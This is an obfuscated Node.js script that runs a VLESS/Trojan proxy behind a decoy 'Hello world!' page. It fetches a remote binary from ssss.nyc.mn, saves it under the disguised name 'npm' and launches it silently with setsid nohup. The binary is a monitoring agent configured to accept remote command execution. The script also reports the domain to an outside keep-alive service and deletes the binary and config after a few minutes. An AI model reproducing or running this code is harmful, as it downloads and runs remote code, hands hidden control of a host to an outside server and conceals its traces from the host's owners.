const _0x5beddb=_0x2924;(function(_0x5579d3,_0x1251e3){const _0x5e096c=_0x2924,_0x113599=_0x5579d3();while(!![]){try{const _0x4868ec=-parseInt(_0x5e096c(0x9c))/0x1*(-parseInt(_0x5e096c(0xa9))/0x2)+-parseInt(_0x5e096c(0xb5))/0x3+parseInt(_0x5e096c(0xbf))/0x4+parseInt(_0x5e096c(0x82))/0x5*(parseInt(_0x5e096c(0x8a))/0x6)+-parseInt(_0x5e096c(0x70))/0x7*(-parseInt(_0x5e096c(0x81))/0x8)+-parseInt(_0x5e096c(0xd3))/0x9*(parseInt(_0x5e096c(0xb9))/0xa)+parseInt(_0x5e096c(0x79))/0xb*(parseInt(_0x5e096c(0x99))/0xc);if(_0x4868ec===_0x1251e3)break;else _0x113599['push'](_0x113599['shift']());}catch(_0x4e8e08){_0x113599['push'](_0x113599['shift']());}}}(_0x4a90,0x191ba));const os=require('os'),http=require(_0x5beddb(0xc6)),fs=require('fs'),axios=require(_0x5beddb(0xac)),net=require('net'),path=require(_0x5beddb(0x93)),crypto=require(_0x5beddb(0x75)),{Buffer}=require(_0x5beddb(0x96)),{exec,execSync}=require(_0x5beddb(0x9f)),{WebSocket,createWebSocketStream}=require('ws'),UUID=process[_0x5beddb(0xc4)][_0x5beddb(0xe6)]||_0x5beddb(0x89),NEZHA_SERVER=process['env']['NEZHA_SERVER']||'',NEZHA_PORT=process[_0x5beddb(0xc4)][_0x5beddb(0x77)]||'',NEZHA_KEY=process[_0x5beddb(0xc4)][_0x5beddb(0xea)]||'',DOMAIN=process[_0x5beddb(0xc4)][_0x5beddb(0xd7)]||_0x5beddb(0x72),AUTO_ACCESS=process[_0x5beddb(0xc4)][_0x5beddb(0xb3)]||!![],WSPATH=process[_0x5beddb(0xc4)][_0x5beddb(0x86)]||UUID[_0x5beddb(0xde)](0x0,0x8),SUB_PATH=process[_0x5beddb(0xc4)]['SUB_PATH']||_0x5beddb(0xae),NAME=process[_0x5beddb(0xc4)][_0x5beddb(0x9b)]||'',PORT=process[_0x5beddb(0xc4)][_0x5beddb(0xb6)]||0x1eb4;let ISP='';function _0x2924(_0x1b677b,_0x2c3ac5){_0x1b677b=_0x1b677b-0x66;const _0x4a90f0=_0x4a90();let _0x2924cf=_0x4a90f0[_0x1b677b];return _0x2924cf;}const GetISP=async()=>{const _0x3e7687=_0x5beddb;try{const _0x5844fb=await axios[_0x3e7687(0x90)]('https://api.ip.sb/geoip'),_0x454d6a=_0x5844fb[_0x3e7687(0x6c)];ISP=(_0x454d6a[_0x3e7687(0xce)]+'-'+_0x454d6a[_0x3e7687(0xb8)])[_0x3e7687(0xaa)](/ /g,'_');}catch(_0x1591b3){ISP=_0x3e7687(0xdc);}};GetISP();function _0x4a90(){const _0xd7e5cf=['555401FtCYbm','config.yaml','unlink','2087','client_secret:\x20','includes','length','finish','200DWIGIc','5FQkQGw','write','2053','\x0askip_connection_count:\x20true\x0askip_procs_count:\x20true\x0atemperature:\x20false\x0atls:\x20','WSPATH','&fp=chrome&type=ws&host=','update','260cf877-a579-4861-866d-d22f8a041256','344586xhzTLk','https://amd64.ssss.nyc.mn/v1','application/json','443','every','aarch64','get','end','npm\x20is\x20running','path','pipe','trim','buffer','--tls','https://amd64.ssss.nyc.mn/agent','36DONIzo','false','NAME','17216qzhzua','arm64','Status','child_process','chmod\x20+x\x20npm',':443?security=tls&sni=','createServer','concat','join','npm\x20running\x20error:','Hello\x20world!','8.8.4.4','\x0ause_gitee_to_upgrade:\x20false\x0ause_ipv6_country_code:\x20false\x0auuid:\x20','8GTWrAR','replace','Automatic\x20Access\x20Task\x20added\x20successfully','axios','2083','Kjzc1t6kfpYpvX1GCEVTVguikT9k8CDu','then','split','npm\x20download\x20successfully','pop','AUTO_ACCESS','close','593970kWcOWu','PORT','Not\x20Found\x0a','isp','24950anQtDU','test','post','catch','log','Server','251916RLUhab','setsid\x20nohup\x20./npm\x20-c\x20config.yaml\x20>/dev/null\x202>&1\x20&','reduce','Failed\x20to\x20resolve\x20','https://arm64.ssss.nyc.mn/agent','env','setsid\x20nohup\x20./npm\x20-s\x20','http','readFile',':443?encryption=none&security=tls&sni=','decode','true','arm','Answer','ps\x20aux\x20|\x20grep\x20-v\x20\x22grep\x22\x20|\x20grep\x20\x22./[n]pm\x22','country_code','\x20--disable-auto-update\x20--report-delay\x204\x20--skip-conn\x20--skip-procs\x20>/dev/null\x202>&1\x20&','NEZHA\x20variable\x20is\x20empty,\x20skip\x20running','send','Server\x20is\x20running\x20on\x20port\x20','468hzEwOR','stream','map','&path=%2F','DOMAIN','error','npm\x20is\x20already\x20running,\x20skip\x20running...','index.html','\x0adebug:\x20false\x0adisable_auto_update:\x20true\x0adisable_command_execute:\x20false\x0adisable_force_update:\x20true\x0adisable_nat:\x20false\x0adisable_send_query:\x20false\x0agpu:\x20false\x0ainsecure_tls:\x20true\x0aip_report_period:\x201800\x0areport_delay:\x204\x0aserver:\x20','Unknown','https://dns.google/resolve?name=','slice','type','trojan://','/bin/bash','text/html','readUInt16BE','toString','connection','UUID','readUInt8','utf-8','connect','NEZHA_KEY','text/plain','\x20with\x20all\x20DNS\x20servers','message','createWriteStream','listen','writeHead','data','1.1.1.1','https://arm64.ssss.nyc.mn/v1','base64','25151FkGJAC','8443','1234.abc.com','url','&type=A','crypto','from','NEZHA_PORT','digest'];_0x4a90=function(){return _0xd7e5cf;};return _0x4a90();}const httpServer=http[_0x5beddb(0xa2)]((_0x32a7d4,_0x42a263)=>{const _0x16fd47=_0x5beddb;if(_0x32a7d4[_0x16fd47(0x73)]==='/'){const _0x5498d7=path[_0x16fd47(0xa4)](__dirname,_0x16fd47(0xda));fs[_0x16fd47(0xc7)](_0x5498d7,'utf8',(_0x378d20,_0x52d91a)=>{const _0xda92cc=_0x16fd47;if(_0x378d20){_0x42a263['writeHead'](0xc8,{'Content-Type':_0xda92cc(0xe2)}),_0x42a263['end'](_0xda92cc(0xa6));return;}_0x42a263[_0xda92cc(0x6b)](0xc8,{'Content-Type':_0xda92cc(0xe2)}),_0x42a263[_0xda92cc(0x91)](_0x52d91a);});return;}else{if(_0x32a7d4[_0x16fd47(0x73)]==='/'+SUB_PATH){const _0x16ebb5=NAME?NAME+'-'+ISP:ISP,_0x1e3a69='vless://'+UUID+'@'+DOMAIN+_0x16fd47(0xc8)+DOMAIN+'&fp=chrome&type=ws&host='+DOMAIN+_0x16fd47(0xd6)+WSPATH+'#'+_0x16ebb5,_0xcf09a5=_0x16fd47(0xe0)+UUID+'@'+DOMAIN+_0x16fd47(0xa1)+DOMAIN+_0x16fd47(0x87)+DOMAIN+_0x16fd47(0xd6)+WSPATH+'#'+_0x16ebb5,_0x35816f=_0x1e3a69+'\x0a'+_0xcf09a5,_0x5a3d62=Buffer[_0x16fd47(0x76)](_0x35816f)[_0x16fd47(0xe4)](_0x16fd47(0x6f));_0x42a263[_0x16fd47(0x6b)](0xc8,{'Content-Type':_0x16fd47(0x66)}),_0x42a263[_0x16fd47(0x91)](_0x5a3d62+'\x0a');}else _0x42a263['writeHead'](0x194,{'Content-Type':_0x16fd47(0x66)}),_0x42a263[_0x16fd47(0x91)](_0x16fd47(0xb7));}}),wss=new WebSocket[(_0x5beddb(0xbe))]({'server':httpServer}),uuid=UUID[_0x5beddb(0xaa)](/-/g,''),DNS_SERVERS=[_0x5beddb(0xa7),_0x5beddb(0x6d)];function resolveHost(_0x44cf21){return new Promise((_0x394d84,_0x4e6a4f)=>{const _0xa8f7c7=_0x2924;if(/^(?:(?:25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)\.){3}(?:25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)$/[_0xa8f7c7(0xba)](_0x44cf21)){_0x394d84(_0x44cf21);return;}let _0x4db431=0x0;function _0x46eef6(){const _0x54df29=_0xa8f7c7;if(_0x4db431>=DNS_SERVERS[_0x54df29(0x7f)]){_0x4e6a4f(new Error(_0x54df29(0xc2)+_0x44cf21+_0x54df29(0x67)));return;}const _0x3daa45=DNS_SERVERS[_0x4db431];_0x4db431++;const _0x5285e2=_0x54df29(0xdd)+encodeURIComponent(_0x44cf21)+_0x54df29(0x74);axios[_0x54df29(0x90)](_0x5285e2,{'timeout':0x1388,'headers':{'Accept':'application/dns-json'}})[_0x54df29(0xaf)](_0x3a2b5c=>{const _0xb9195a=_0x54df29,_0x2254e2=_0x3a2b5c[_0xb9195a(0x6c)];if(_0x2254e2[_0xb9195a(0x9e)]===0x0&&_0x2254e2[_0xb9195a(0xcc)]&&_0x2254e2[_0xb9195a(0xcc)]['length']>0x0){const _0x21b9a5=_0x2254e2[_0xb9195a(0xcc)]['find'](_0x37fa68=>_0x37fa68[_0xb9195a(0xdf)]===0x1);if(_0x21b9a5){_0x394d84(_0x21b9a5['data']);return;}}_0x46eef6();})[_0x54df29(0xbc)](_0x4165f2=>{_0x46eef6();});}_0x46eef6();});}function handleVlessConnection(_0x542a94,_0x162027){const _0x2e42e3=_0x5beddb,[_0x4ea939]=_0x162027,_0x584f0d=_0x162027[_0x2e42e3(0xde)](0x1,0x11);if(!_0x584f0d[_0x2e42e3(0x8e)]((_0x2d4891,_0x2a9236)=>_0x2d4891==parseInt(uuid['substr'](_0x2a9236*0x2,0x2),0x10)))return![];let _0x596036=_0x162027[_0x2e42e3(0xde)](0x11,0x12)[_0x2e42e3(0xe7)]()+0x13;const _0xaf1f02=_0x162027[_0x2e42e3(0xde)](_0x596036,_0x596036+=0x2)['readUInt16BE'](0x0),_0x482eb6=_0x162027['slice'](_0x596036,_0x596036+=0x1)['readUInt8'](),_0x5b5e4d=_0x482eb6==0x1?_0x162027[_0x2e42e3(0xde)](_0x596036,_0x596036+=0x4)['join']('.'):_0x482eb6==0x2?new TextDecoder()[_0x2e42e3(0xc9)](_0x162027[_0x2e42e3(0xde)](_0x596036+0x1,_0x596036+=0x1+_0x162027['slice'](_0x596036,_0x596036+0x1)[_0x2e42e3(0xe7)]())):_0x482eb6==0x3?_0x162027['slice'](_0x596036,_0x596036+=0x10)[_0x2e42e3(0xc1)]((_0x338a31,_0x212ed4,_0x558182,_0x2574f7)=>_0x558182%0x2?_0x338a31[_0x2e42e3(0xa3)](_0x2574f7[_0x2e42e3(0xde)](_0x558182-0x1,_0x558182+0x1)):_0x338a31,[])[_0x2e42e3(0xd5)](_0x12f2a1=>_0x12f2a1[_0x2e42e3(0xe3)](0x0)['toString'](0x10))['join'](':'):'';_0x542a94[_0x2e42e3(0xd1)](new Uint8Array([_0x4ea939,0x0]));const _0x1f99c1=createWebSocketStream(_0x542a94);return resolveHost(_0x5b5e4d)[_0x2e42e3(0xaf)](_0xb6328d=>{const _0x4e8935=_0x2e42e3;net['connect']({'host':_0xb6328d,'port':_0xaf1f02},function(){const _0x1da9a5=_0x2924;this['write'](_0x162027[_0x1da9a5(0xde)](_0x596036)),_0x1f99c1['on'](_0x1da9a5(0xd8),()=>{})[_0x1da9a5(0x94)](this)['on']('error',()=>{})[_0x1da9a5(0x94)](_0x1f99c1);})['on'](_0x4e8935(0xd8),()=>{});})['catch'](_0x5bf0ba=>{const _0x1d5627=_0x2e42e3;net[_0x1d5627(0xe9)]({'host':_0x5b5e4d,'port':_0xaf1f02},function(){const _0x4ef161=_0x1d5627;this[_0x4ef161(0x83)](_0x162027['slice'](_0x596036)),_0x1f99c1['on']('error',()=>{})['pipe'](this)['on'](_0x4ef161(0xd8),()=>{})[_0x4ef161(0x94)](_0x1f99c1);})['on'](_0x1d5627(0xd8),()=>{});}),!![];}function handleTrojanConnection(_0x503eeb,_0x267aaa){const _0x4e5164=_0x5beddb;try{if(_0x267aaa[_0x4e5164(0x7f)]<0x3a)return![];const _0x48b30e=_0x267aaa[_0x4e5164(0xde)](0x0,0x38)[_0x4e5164(0xe4)](),_0x4113ba=[UUID];let _0x29f6f3=null;for(const _0x2c6749 of _0x4113ba){const _0x2945a7=crypto['createHash']('sha224')[_0x4e5164(0x88)](_0x2c6749)[_0x4e5164(0x78)]('hex');if(_0x2945a7===_0x48b30e){_0x29f6f3=_0x2c6749;break;}}if(!_0x29f6f3)return![];let _0x3aac33=0x38;_0x267aaa[_0x3aac33]===0xd&&_0x267aaa[_0x3aac33+0x1]===0xa&&(_0x3aac33+=0x2);const _0x1bbf75=_0x267aaa[_0x3aac33];if(_0x1bbf75!==0x1)return![];_0x3aac33+=0x1;const _0xb5eb81=_0x267aaa[_0x3aac33];_0x3aac33+=0x1;let _0x4e5185,_0x370a4d;if(_0xb5eb81===0x1)_0x4e5185=_0x267aaa['slice'](_0x3aac33,_0x3aac33+0x4)[_0x4e5164(0xa4)]('.'),_0x3aac33+=0x4;else{if(_0xb5eb81===0x3){const _0x16aaca=_0x267aaa[_0x3aac33];_0x3aac33+=0x1,_0x4e5185=_0x267aaa[_0x4e5164(0xde)](_0x3aac33,_0x3aac33+_0x16aaca)[_0x4e5164(0xe4)](),_0x3aac33+=_0x16aaca;}else{if(_0xb5eb81===0x4)_0x4e5185=_0x267aaa['slice'](_0x3aac33,_0x3aac33+0x10)['reduce']((_0x5c7a95,_0x379a03,_0x333354,_0x104d84)=>_0x333354%0x2?_0x5c7a95[_0x4e5164(0xa3)](_0x104d84[_0x4e5164(0xde)](_0x333354-0x1,_0x333354+0x1)):_0x5c7a95,[])[_0x4e5164(0xd5)](_0x21e31e=>_0x21e31e[_0x4e5164(0xe3)](0x0)[_0x4e5164(0xe4)](0x10))['join'](':'),_0x3aac33+=0x10;else return![];}}_0x370a4d=_0x267aaa[_0x4e5164(0xe3)](_0x3aac33),_0x3aac33+=0x2;_0x3aac33<_0x267aaa[_0x4e5164(0x7f)]&&_0x267aaa[_0x3aac33]===0xd&&_0x267aaa[_0x3aac33+0x1]===0xa&&(_0x3aac33+=0x2);const _0x2df735=createWebSocketStream(_0x503eeb);return resolveHost(_0x4e5185)[_0x4e5164(0xaf)](_0x12b5f2=>{const _0x36acde=_0x4e5164;net[_0x36acde(0xe9)]({'host':_0x12b5f2,'port':_0x370a4d},function(){const _0x37ab93=_0x36acde;_0x3aac33<_0x267aaa[_0x37ab93(0x7f)]&&this[_0x37ab93(0x83)](_0x267aaa[_0x37ab93(0xde)](_0x3aac33)),_0x2df735['on'](_0x37ab93(0xd8),()=>{})[_0x37ab93(0x94)](this)['on'](_0x37ab93(0xd8),()=>{})[_0x37ab93(0x94)](_0x2df735);})['on'](_0x36acde(0xd8),()=>{});})['catch'](_0x147432=>{const _0x348403=_0x4e5164;net[_0x348403(0xe9)]({'host':_0x4e5185,'port':_0x370a4d},function(){const _0x261944=_0x348403;_0x3aac33<_0x267aaa['length']&&this['write'](_0x267aaa['slice'](_0x3aac33)),_0x2df735['on']('error',()=>{})[_0x261944(0x94)](this)['on'](_0x261944(0xd8),()=>{})[_0x261944(0x94)](_0x2df735);})['on'](_0x348403(0xd8),()=>{});}),!![];}catch(_0x409003){return![];}}wss['on'](_0x5beddb(0xe5),(_0x1c987b,_0x4169a7)=>{const _0x4565e6=_0x5beddb,_0x117f94=_0x4169a7[_0x4565e6(0x73)]||'';_0x1c987b['once'](_0x4565e6(0x68),_0x4dc3ac=>{const _0x3ff61d=_0x4565e6;if(_0x4dc3ac['length']>0x11&&_0x4dc3ac[0x0]===0x0){const _0xb5c122=_0x4dc3ac[_0x3ff61d(0xde)](0x1,0x11),_0x1004d5=_0xb5c122['every']((_0x8fe680,_0x183f7b)=>_0x8fe680==parseInt(uuid['substr'](_0x183f7b*0x2,0x2),0x10));if(_0x1004d5){!handleVlessConnection(_0x1c987b,_0x4dc3ac)&&_0x1c987b[_0x3ff61d(0xb4)]();return;}}!handleTrojanConnection(_0x1c987b,_0x4dc3ac)&&_0x1c987b[_0x3ff61d(0xb4)]();})['on'](_0x4565e6(0xd8),()=>{});});const getDownloadUrl=()=>{const _0x3f07f4=_0x5beddb,_0x14077a=os['arch']();return _0x14077a===_0x3f07f4(0xcb)||_0x14077a===_0x3f07f4(0x9d)||_0x14077a===_0x3f07f4(0x8f)?!NEZHA_PORT?_0x3f07f4(0x6e):_0x3f07f4(0xc3):!NEZHA_PORT?_0x3f07f4(0x8b):_0x3f07f4(0x98);},downloadFile=async()=>{const _0x183c18=_0x5beddb;if(!NEZHA_SERVER&&!NEZHA_KEY)return;try{const _0x1a28c6=getDownloadUrl(),_0x144d80=await axios({'method':'get','url':_0x1a28c6,'responseType':_0x183c18(0xd4)}),_0xe93efb=fs[_0x183c18(0x69)]('npm');return _0x144d80[_0x183c18(0x6c)][_0x183c18(0x94)](_0xe93efb),new Promise((_0x59b896,_0x22c00d)=>{const _0x40ed67=_0x183c18;_0xe93efb['on'](_0x40ed67(0x80),()=>{const _0x224237=_0x40ed67;console[_0x224237(0xbd)](_0x224237(0xb1)),exec(_0x224237(0xa0),_0x2f2716=>{if(_0x2f2716)_0x22c00d(_0x2f2716);_0x59b896();});}),_0xe93efb['on'](_0x40ed67(0xd8),_0x22c00d);});}catch(_0x2ae33f){throw _0x2ae33f;}},runnz=async()=>{const _0x2ca014=_0x5beddb;try{const _0x4ccef6=execSync(_0x2ca014(0xcd),{'encoding':_0x2ca014(0xe8)});if(_0x4ccef6[_0x2ca014(0x95)]()!==''){console[_0x2ca014(0xbd)](_0x2ca014(0xd9));return;}}catch(_0x2114c0){}await downloadFile();let _0x4ade9a='',_0x1b6152=[_0x2ca014(0x8d),_0x2ca014(0x71),'2096',_0x2ca014(0x7c),_0x2ca014(0xad),_0x2ca014(0x84)];if(NEZHA_SERVER&&NEZHA_PORT&&NEZHA_KEY){const _0x47f77b=_0x1b6152['includes'](NEZHA_PORT)?_0x2ca014(0x97):'';_0x4ade9a=_0x2ca014(0xc5)+NEZHA_SERVER+':'+NEZHA_PORT+'\x20-p\x20'+NEZHA_KEY+'\x20'+_0x47f77b+_0x2ca014(0xcf);}else{if(NEZHA_SERVER&&NEZHA_KEY){if(!NEZHA_PORT){const _0x51b384=NEZHA_SERVER[_0x2ca014(0x7e)](':')?NEZHA_SERVER[_0x2ca014(0xb0)](':')[_0x2ca014(0xb2)]():'',_0xc0ebe6=_0x1b6152['includes'](_0x51b384)?_0x2ca014(0xca):_0x2ca014(0x9a),_0x487d86=_0x2ca014(0x7d)+NEZHA_KEY+_0x2ca014(0xdb)+NEZHA_SERVER+_0x2ca014(0x85)+_0xc0ebe6+_0x2ca014(0xa8)+UUID;fs['writeFileSync'](_0x2ca014(0x7a),_0x487d86);}_0x4ade9a=_0x2ca014(0xc0);}else{console['log'](_0x2ca014(0xd0));return;}}try{exec(_0x4ade9a,{'shell':_0x2ca014(0xe1)},_0x10fbbc=>{const _0x95c4d9=_0x2ca014;if(_0x10fbbc)console['error'](_0x95c4d9(0xa5),_0x10fbbc);else console[_0x95c4d9(0xbd)](_0x95c4d9(0x92));});}catch(_0x288d35){console[_0x2ca014(0xd8)]('error:\x20'+_0x288d35);}};async function addAccessTask(){const _0xb5cee9=_0x5beddb;if(!AUTO_ACCESS)return;if(!DOMAIN)return;const _0x851ee9='https://'+DOMAIN;try{const _0x4cd6c4=await axios[_0xb5cee9(0xbb)]('https://oooo.serv00.net/add-url',{'url':_0x851ee9},{'headers':{'Content-Type':_0xb5cee9(0x8c)}});console['log'](_0xb5cee9(0xab));}catch(_0x41eeab){}}const delFiles=()=>{const _0x5b4d2d=_0x5beddb;fs[_0x5b4d2d(0x7b)]('npm',()=>{}),fs[_0x5b4d2d(0x7b)](_0x5b4d2d(0x7a),()=>{});};httpServer[_0x5beddb(0x6a)](PORT,()=>{const _0x29d339=_0x5beddb;runnz(),setTimeout(()=>{delFiles();},0x2bf20),console['log'](_0x29d339(0xd2)+PORT);});
